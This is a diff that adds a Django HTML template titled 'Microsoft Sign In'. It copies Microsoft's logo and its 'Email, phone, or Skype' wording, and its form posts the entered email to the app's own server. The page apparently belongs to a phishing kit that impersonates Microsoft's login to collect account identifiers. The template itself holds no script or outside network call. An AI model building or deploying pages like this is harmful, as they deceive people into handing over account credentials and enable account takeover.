@@ -1,0 +1,32 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Sign In</title>
+  <link rel="stylesheet" href="{% static 'networkbinary/css/outl.css' %}">
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/micrologo.png' %}" />
+
+</head>
+<body>
+  <div class="background">
+    <div class="login-box">
+      <img src="{% static 'networkbinary/images/microsoft-80658_1280.webp' %}" alt="Microsoft" class="logo" />
+      <h2>Sign in</h2>
+      <form action="" method="POST">
+        {% csrf_token %}
+      <input type="email" name="email" placeholder="Email, phone, or Skype" class="input-field"/>
+      <button class="next-btn">Next</button>
+
+      <!-- <div class="links">
+        <p>No account? <a href="#">Create one!</a></p>
+        <a href="#">Can’t access your account?</a>
+      </div> -->
+
+    </form>
+    </div>
+  </div>
+</body>
+</html>
+
